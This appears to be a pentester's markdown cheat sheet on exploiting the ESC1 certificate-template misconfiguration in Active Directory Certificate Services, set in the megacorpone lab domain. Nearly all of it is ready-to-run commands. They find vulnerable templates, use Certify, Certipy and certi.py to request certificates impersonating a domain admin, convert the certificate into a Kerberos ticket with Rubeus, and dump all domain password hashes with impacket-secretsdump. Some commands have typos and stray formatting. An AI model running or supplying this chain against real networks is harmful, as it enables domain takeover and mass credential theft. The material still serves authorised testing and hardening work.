# General Overview: 

A certificate template with the ESC1 vulnerability allows low-privileged users to enroll and request certificates on behalf of any domain object they specify. This means that any user with enrollment rights can request a certificate for a high-privilege account, such as a domain administrator.

To exploit ESC1, the certificate template must meet specific criteria:

- **Enrollment Rights**: The userâ€™s group must have enrollment rights, allowing them to request a new certificate from the Certificate Authority (CA).
- **Extended Key Usage: Client Authentication**: The template must support client authentication, enabling the generated certificate to authenticate to domain computers.
- **Enrollee Supplies Subject**: This option must be set to True, allowing the user to supply the SAN (Subject Alternative Name).
- **No Manager Approval Required**: The certificate request should be auto-approved without needing manager approval.

# Abusing ESC1 Certificates

## PowerShell:
- `Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=megacorpone,DC=com'`

## Locksmith: 
- Source: https://github.com/TrimarcJake/Locksmith
1.  `Import-Module ./Locksmith.psd1`
2.  `Invoke-Locksmith -Scan All`
3. `Invoke-Locksmith -Scans ESC1`
4. `Invoke-Locksmith -Scans ESC1,ESC2,ESC8`

## Certify:
- `Certify.exe request /ca:ca.megacorponeone.com\domain-DC-CA /template:VulnTemplate /altname:'domain admin'`

## Certipy:

Specify a user account in the SAN:
User Account: 
- `certipy-ad req -u "afsimmons@megacorpone.com" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'xadmin'
- `certipy-ad req -u "afsimmons@megacorpone.com" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -upn 'xadmin@megacorpone.com -dns dc.megacorpone.com'
Computer Account: 
- `certipy-ad req -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -dns 'dc.megacorpone.com'
## Certi
- `python certi.py 'megacorpone.com/afsimmons@dc01.megacorpone.com' megacorpone-DC01-CA -k -n --alt-name spawn --template UserSAN`
`
# Converting the vulnerable ESC1 template:

## OpenSSL

`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`

## Rubeus: 

`Rubeus.exe asktgt /user:xadmin /certificate:C:\Temp\cert.pfx`

# Abusing our vulnerable template: 

## certipy
Authenticating with certipy:
- ` certipy-ad auth -pfx vulnerable.pfx -dc-ip 172.21.0.0`
Using secretdumps to dump all user hashes with the extracted hash from certipy:
- impacket-secretsdump 'megacorpone.com/DC1@172.21.0.0' -hashes 'aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3'



Reference: 
 - https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/
 - https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/